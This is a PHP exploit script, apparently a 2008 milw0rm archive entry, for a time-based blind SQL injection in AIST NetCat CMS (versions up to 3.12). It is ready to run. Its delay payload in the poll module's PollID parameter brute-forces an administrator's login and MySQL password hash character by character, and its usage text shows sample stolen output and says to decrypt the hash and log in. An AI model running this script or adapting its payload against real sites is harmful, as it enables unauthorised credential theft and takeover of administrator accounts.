<?

/*
	AIST NetCat Blind SQL Injection exploit by s4avrd0w [s4avrd0w@p0c.ru]
	Versions affected <= 3.12

	More info: http://www.netcat.ru/

	* tested on version 3.0, 3.12

	usage: 

	# ./NetCat_blind_SQL_exploit.php -s=NetCat_server -u=User_ID

	The options are required:
	 -u The user identifier (number in table)
	 -s Target for exploiting

	example:

	# ./NetCat_blind_SQL_exploit.php -s=http://localhost/netcat/ -u=2

	[+] Phase 1 brute login.
	[+] Brute 1 symbol...
	...........a
	[+] Brute 2 symbol...
	..............d
	[+] Brute 3 symbol...
	.......................m
	[+] Brute 4 symbol...
	...................i
	[+] Brute 5 symbol...
	........................n
	[+] Brute 6 symbol...
	.....................................
	[+] Phase 1 successfully finished: admin
	[+] Phase 2 brute password-hash.
	[+] Brute 1 symbol...
	*
	[+] Brute 2 symbol...
	.0
	[+] Brute 3 symbol...
	.0
	[+] Brute N symbol...
	
	<...>
	
	[+] Brute 42 symbol...
	.....................................
	[+] Phase 2 successfully finished: *00a51f3f48415c7d4e8908980d443c29c69b60c9
	
	
	[+] Exploiting is finished successfully
	[+] Login - admin
	[+] MySQL hash - *00a51f3f48415c7d4e8908980d443c29c69b60c9
	[+] Decrypt MySQL hash and login into NetCat CMS.

*/


function http_connect($query)
{

	global $server;

	$headers = array(
	    'User-Agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14',
	    'Referer' => $server
	);

	$res_http = new HttpRequest($server."modules/poll/?cc=62&PollID=1".$query, HttpRequest::METH_GET);
	$res_http->addHeaders($headers);

	$t = mktime();
	try {
		$response = $res_http->send()->getBody();

		$t = mktime() - $t;

		if ($t > 4)
		{
			return 1;
		}
		else
		{
			return 0;
		}

	} catch (HttpException $exception) {

		print "[-] Not connected";
		exit(0);

	}

}

function brute($User_id,$table)
{
	$ret_str = "";

	if ($table == "Password")
	{
		$b_str = "*1234567890abcdef";
	}
	else
	{
		$b_str = "1abcdefghijklmnopqrstuvwxyz_234567890 !'#%&()*+,-./:;<=>?@[\]^{|}~Ã Ã¡Ã¢Ã£Ã¤Ã¥Ã¦Ã§Ã¨Ã©ÃªÃ«Ã¬Ã­Ã®Ã¯Ã°Ã±Ã²Ã³Ã´ÃµÃ¶Ã·Ã¸Ã¹ÃºÃ»Ã¼Ã½Ã¾Ã¿Å¾";
	}

	$b_arr = str_split($b_str);

	for ($i=1;$i<43;$i++)
	{
		print "[+] Brute $i symbol...\n";

		for ($j=0;$j<count($b_arr);$j++)
		{
			$brute = ord($b_arr[$j]);
			$q = "/**/AND/**/1=if((ASCII(lower(SUBSTRING((SELECT/**/$table/**/FROM/**/USER/**/limit/**/$User_id,1),$i,1))))=$brute,benchmark(1,benchmark(2000000,md5(now()))),0)";

			if (http_connect($q))
			{
				$ret_str=$ret_str.$b_arr[$j];
				print $b_arr[$j]."\n";
				break;
			}
			print ".";


		}

		if ($j == count($b_arr)) break;
	}

	return $ret_str;
}


function help_argc($script_name)
{
print "
usage:

# ./".$script_name." -s=NetCat_server -u=User_ID

The options are required:
 -u The user identifier (number in table)
 -s Target for exploiting

example:

# ./".$script_name." -s=http://localhost/netcat/ -u=1
[+] Phase 1 brute login.
[+] Brute 1 symbol...
..1
[+] Brute 2 symbol...
.....................................
[+] Phase 1 successfully finished: 1
[+] Phase 2 brute password-hash.
[+] Brute 1 symbol...
.....................................
[+] Phase 2 successfully finished:


[+] Exploiting is finished successfully
[+] Login - 1
[+] MySQL hash -
[+] You can login into NetCat CMS with the empty password
";
}

function successfully($login,$hash)
{
print "

[+] Exploiting is finished successfully
[+] Login - $login
[+] MySQL hash - $hash
";

if ($hash) print "[+] Decrypt MySQL hash and login into NetCat CMS.\n";
else print "[+] You can login into NetCat CMS with the empty password\n";

}

if (($argc != 3) || in_array($argv[1], array('--help', '-help', '-h', '-?')))
{
	help_argc($argv[0]);
	exit(0);
}
else
{
	$ARG = array(); 
	foreach ($argv as $arg) { 
		if (strpos($arg, '-') === 0) { 
			$key = substr($arg,1,1);
			if (!isset($ARG[$key])) $ARG[$key] = substr($arg,3,strlen($arg)); 
		} 
	}

	if ($ARG[s] && $ARG[u])
	{
		$server = $ARG[s];
		$User_id = intval($ARG[u]);
		$User_id--;

		print "[+] Phase 1 brute login.\n";
		$login = brute($User_id,"Login");
		print "\n[+] Phase 1 successfully finished: $login\n";

		print "[+] Phase 2 brute password-hash.\n";
		$hash = brute($User_id,"Password");
		print "\n[+] Phase 2 successfully finished: $hash\n";

		successfully($login,$hash);
	}
	else
	{
		help_argc($argv[0]);
		exit(0);
	}

}

?> 

# milw0rm.com [2008-12-29]
